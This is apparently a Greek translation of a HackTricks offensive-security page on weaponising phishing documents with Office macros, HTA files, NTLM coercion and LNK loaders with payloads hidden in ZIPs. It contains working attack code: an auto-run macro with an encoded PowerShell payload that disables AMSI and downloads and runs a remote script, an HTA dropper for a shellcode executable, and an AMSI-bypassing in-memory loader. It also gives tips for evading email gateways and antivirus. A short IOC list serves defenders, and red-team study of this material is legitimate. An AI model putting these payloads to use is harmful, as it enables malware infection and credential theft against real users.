# Phishing Αρχεία & Έγγραφα

{{#include ../../banners/hacktricks-training.md}}

## Office Έγγραφα

Το Microsoft Word εκτελεί έλεγχο εγκυρότητας δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Ο έλεγχος εγκυρότητας δεδομένων πραγματοποιείται με τη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοιχτεί.

Συνήθως, τα αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατόν να μετονομαστεί το αρχείο αλλάζοντας την επέκταση αρχείου και να διατηρηθεί η ικανότητα εκτέλεσης των macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros από σχεδιασμό, αλλά ένα αρχείο DOCM μετονομασμένο σε RTF θα χειριστείται από το Microsoft Word και θα είναι ικανό για εκτέλεση macros.\
Οι ίδιες εσωτερικές λειτουργίες και μηχανισμοί ισχύουν για όλο το λογισμικό του Microsoft Office Suite (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελούνται από ορισμένα προγράμματα Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Φόρτωση εξωτερικής εικόνας

Μεταβείτε στο: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Είναι δυνατό να χρησιμοποιηθούν macros για να εκτελέσουν arbitrary code από το έγγραφο.

#### Autoload functions

Όσο πιο συνηθισμένες είναι, τόσο πιο πιθανό είναι το AV να τις εντοπίσει.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Αφαίρεση μεταδεδομένων χειροκίνητα

Μεταβείτε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα ανοίξει το Document Inspector. Κάντε κλικ στο **Inspect** και στη συνέχεια **Remove All** δίπλα στο **Document Properties and Personal Information**.

#### Επέκταση αρχείου

Όταν τελειώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type**, αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
Κάντε αυτό επειδή **δεν μπορείτε να αποθηκεύσετε macro's μέσα σε ένα `.docx`** και υπάρχει ένα **στίγμα** γύρω από την macro-enabled **`.docm`** επέκταση (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένες web/email gateway το μπλοκάρουν εντελώς). Επομένως, αυτή η **παλαιού τύπου επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.

#### Δημιουργοί Κακόβουλων Macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και scripting languages (όπως VBScript και JScript)**. Δημιουργεί το user interface και εκτελείται ως εφαρμογή "fully trusted", χωρίς τους περιορισμούς του μοντέλου ασφαλείας ενός browser.

Ένα HTA εκτελείται με χρήση του **`mshta.exe`**, το οποίο συνήθως είναι εγκατεστημένο μαζί με τον **Internet Explorer**, καθιστώντας το **`mshta` εξαρτώμενο από τον IE**. Οπότε, εάν έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός αυθεντικοποίησης NTLM

Υπάρχουν διάφοροι τρόποι για να **εξαναγκάσετε την αυθεντικοποίηση NTLM "απομακρυσμένα"**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που ο χρήστης θα προσπελάσει (ακόμα και HTTP MitM?). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **προκαλέσει** μια **αυθεντικοποίηση** απλά με το **άνοιγμα του φακέλου.**

**Δείτε αυτές τις ιδέες και περισσότερα στις παρακάτω σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι μπορείτε όχι μόνο να κλέψετε το hash ή την αυθεντικοποίηση αλλά και να **εκτελέσετε NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Πολύ αποτελεσματικές καμπάνιες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα δολώματα (PDF/DOCX) και ένα κακόβουλο .lnk. Το κόλπο είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από έναν μοναδικό marker, και το .lnk το εξάγει και το τρέχει ολοκληρωτικά στη μνήμη.

Τυπική ροή που υλοποιείται από το .lnk PowerShell one-liner:

1) Εντοπίστε το αρχικό ZIP σε συνήθεις διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, και τον γονικό φάκελο του τρέχοντος working directory.
2) Read the ZIP bytes and find a hardcoded marker (e.g., xFIQCV). Everything after the marker is the embedded PowerShell payload.
3) Αντιγράψτε το ZIP σε %ProgramData%, αποσυμπιέστε το εκεί και ανοίξτε το δολωμένο .docx ώστε να φαίνεται νόμιμο.
4) Παρακάμψτε το AMSI για τη τρέχουσα διαδικασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Καθαρίστε (deobfuscate) το επόμενο στάδιο (π.χ., αφαιρέστε όλους τους χαρακτήρες '#') και εκτελέστε το στη μνήμη.

Παράδειγμα PowerShell skeleton για να carve και να τρέξει το embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Σημειώσεις
- Η παράδοση συχνά καταχράται αξιόπιστους υποτομείς PaaS (π.χ., *.herokuapp.com) και μπορεί να φιλτράρει τα payloads (σερβίροντας benign ZIPs με βάση IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc για να ελαχιστοποιήσει τα ίχνη στο δίσκο.

Persistence που χρησιμοποιείται στην ίδια αλυσίδα
- COM TypeLib hijacking του Microsoft Web Browser control έτσι ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή που το ενσωματώνει να επανεκκινεί το payload αυτόματα. Δείτε λεπτομέρειες και έτοιμες εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Κυνηγητό/IOCs
- ZIP αρχεία που περιέχουν το ASCII marker string (π.χ., xFIQCV) προσαρτημένο στα δεδομένα του αρχείου.
- .lnk που απαριθμεί φακέλους γονέα/χρήστη για να εντοπίσει το ZIP και ανοίγει ένα ψεύτικο έγγραφο.
- Παραποίηση AMSI μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Μακροχρόνια business threads που καταλήγουν σε links φιλοξενούμενα σε αξιόπιστους PaaS domains.

## Windows αρχεία για κλοπή NTLM hashes

Δείτε τη σελίδα για **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Αναφορές

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
